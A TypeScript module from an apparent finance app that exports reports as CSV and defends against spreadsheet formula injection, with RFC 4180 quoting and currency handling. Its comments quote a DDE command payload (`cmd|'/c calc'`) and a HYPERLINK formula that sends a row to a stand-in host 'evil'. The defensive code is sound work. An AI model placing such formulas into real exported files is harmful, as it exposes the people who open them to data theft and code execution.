import type { ReportColumn, ReportRow } from '@financy/contracts';

/**
 * Characters a spreadsheet treats as the start of a formula.
 *
 * `=` and `+` are the obvious ones. `-` and `@` are the ones people forget:
 * `-2+3+cmd|'/c calc'!A0` is a working payload in Excel, and `@SUM(...)` is a
 * Lotus-compatible formula Excel still honours. Tab and carriage return are
 * here because Excel strips leading whitespace before deciding, so `\t=1+1`
 * becomes a formula again after the guard has passed it.
 */
const FORMULA_PREFIXES = ['=', '+', '-', '@', '\t', '\r'];

/**
 * Escape one CSV field (docs/15 §9).
 *
 * ## A spreadsheet is an execution context
 *
 * A merchant name is user-controlled text, and it arrives here from a card
 * network with no filtering of any kind. Exported unescaped into a `.csv` and
 * opened in Excel, `=HYPERLINK("http://evil/"&A1,"Click")` is a live formula
 * that exfiltrates the row beside it — and the person who opens the file is a
 * finance administrator with every record in the organisation on screen.
 *
 * The defence is a leading apostrophe, which every major spreadsheet reads as
 * "the rest of this is text". It is visible in the cell, which is the trade:
 * a slightly odd-looking merchant name, against a file that runs code.
 *
 * ## Quoting is RFC 4180, not "add quotes if it looks like it needs them"
 *
 * A field containing a quote doubles it. A field containing a comma, a quote,
 * or a newline is wrapped. Anything less produces a file that opens with one
 * shifted column somewhere in the middle, which nobody notices until a total
 * is wrong.
 */
export function escapeCsvField(value: string): string {
  const guarded = FORMULA_PREFIXES.some((prefix) => value.startsWith(prefix))
    ? `'${value}`
    : value;

  if (!/[",\n\r]/.test(guarded)) return guarded;

  return `"${guarded.replaceAll('"', '""')}"`;
}

/**
 * A report as a CSV document.
 *
 * **Money is an unformatted decimal string with its currency in a column of
 * its own** (docs/15 §9). A cell reading `€1,234.50` is text to a spreadsheet
 * and cannot be summed; a cell reading `1234.5000` beside a `USD` column can.
 *
 * The byte-order mark is deliberate and is the reason a `£` renders correctly
 * when the file is double-clicked on Windows: Excel assumes the system
 * codepage for a `.csv` without one, and a report full of `Â£` is a report
 * somebody re-types by hand.
 */
export function toCsv(columns: readonly ReportColumn[], rows: readonly ReportRow[]): string {
  const header: string[] = [];

  for (const column of columns) {
    header.push(escapeCsvField(column.label));
    if (column.kind === 'money') header.push(escapeCsvField(`${column.label} currency`));
  }

  const lines = [header.join(',')];

  for (const row of rows) {
    const cells: string[] = [];

    for (const column of columns) {
      const value = row[column.key];

      if (value !== null && typeof value === 'object') {
        cells.push(escapeCsvField(value.amount));
        cells.push(escapeCsvField(value.currency));
        continue;
      }

      cells.push(escapeCsvField(value === null || value === undefined ? '' : String(value)));

      if (column.kind === 'money') cells.push('');
    }

    lines.push(cells.join(','));
  }

  // CRLF, which is what RFC 4180 specifies and what Excel expects. The BOM is
  // written as an escape rather than pasted, so it is visible to whoever reads
  // this next.
  const BYTE_ORDER_MARK = '\uFEFF';

  return `${BYTE_ORDER_MARK}${lines.join('\r\n')}\r\n`;
}
